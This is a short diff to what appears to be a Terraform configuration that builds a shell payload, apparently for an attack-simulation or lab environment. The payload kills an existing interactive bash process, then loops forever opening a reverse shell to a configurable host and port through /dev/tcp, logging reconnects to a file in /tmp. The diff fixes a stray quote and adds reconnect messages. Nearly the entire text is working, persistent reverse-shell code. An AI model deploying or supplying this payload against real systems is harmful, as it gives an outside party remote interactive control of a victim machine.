@@ -4,12 +4,13 @@ locals {
 
     payload = <<-EOT
     truncate -s 0 /tmp/attacker_exec_reverseshell_target.log
-    echo "Attacker Host: ${local.host_ip}:${local.host_port}" > /tmp/attacker_exec_reverseshell_target.log",
+    echo "Attacker Host: ${local.host_ip}:${local.host_port}" > /tmp/attacker_exec_reverseshell_target.log
     kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')
     echo "Running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'" >> /tmp/attacker_exec_reverseshell_target.log
     while true; do
+        echo "reconnecting: ${local.host_ip}:${local.host_port}" >> /tmp/attacker_exec_reverseshell_target.log;
         while ! /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do
-            echo "reconnecting..." >> /tmp/attacker_exec_reverseshell_target.log;
+            echo "reconnecting: ${local.host_ip}:${local.host_port}" >> /tmp/attacker_exec_reverseshell_target.log;
             sleep 10;
         done;
         echo "disconnected - wait retry..." >> /tmp/attacker_exec_reverseshell_target.log;
